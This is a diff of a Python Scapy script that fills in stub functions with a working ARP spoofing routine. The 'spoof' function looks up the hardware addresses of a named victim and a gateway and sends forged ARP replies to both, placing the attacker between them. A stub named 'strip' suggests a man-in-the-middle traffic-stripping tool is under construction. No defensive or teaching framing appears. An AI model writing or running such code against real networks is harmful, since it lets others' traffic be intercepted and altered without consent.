@@ -38,11 +38,24 @@ def myip():
     res = arps.psrc
     return res
 
-def sp(vfrom, vto):
-    print()
+def sp(vfrom, vto, vtohw):
+    arps = ARP()
+    arps.op = 2
+    arps.psrc = str(vfrom)
+    arps.pdst = str(vto)
+    arps.hwdst = str(vtohw)
+    send(arps, verbose=False)
     
-def spoof(victim, gatway):
-    print()
+def spoof(victim, gateway):
+    arps1 = ARP(pdst=str(victim))
+    arps2 = ARP(pdst=str(gateway))
+    r1 = sr1(arps1, verbose=False, timeout=3)
+    r2 = sr1(arps2, verbose=False, timeout=3)
+    if r1 != None and r2 != None:
+        hw1 = r1.hwsrc
+        hw2 = r2.hwsrc
+        sp(victim, gateway, hw2)
+        sp(gateway, victim, hw1)
 
 def strip(chosenpacket):
     print()
